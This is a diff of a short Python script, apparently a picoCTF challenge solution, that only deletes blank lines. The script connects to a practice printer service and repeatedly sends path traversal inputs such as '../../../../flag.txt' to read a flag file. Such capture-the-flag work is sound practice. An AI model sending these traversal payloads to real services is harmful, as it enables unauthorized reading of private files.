@@ -1,9 +1,7 @@
 import socket
 import time
-
 HOST = "dolphin-cove.picoctf.net"
 PORT =  57099
-
 printers = [b"1\n", b"2\n"]
 paths = [
     b"../../../../flag.txt\n",
@@ -11,7 +9,6 @@ paths = [
     b"../../../flag.txt\n",
     b"../../../flag\n"
 ]
-
 while True:
     try:
         print("[+] Connecting to printer service...")
@@ -42,10 +39,8 @@ while True:
                     pass
 
         s.close()
-
         print("[*] Waiting for next cron cycle (60s)...\n")
         time.sleep(60)
-
     except Exception as e:
         print("Retrying...", e)
         time.sleep(5)
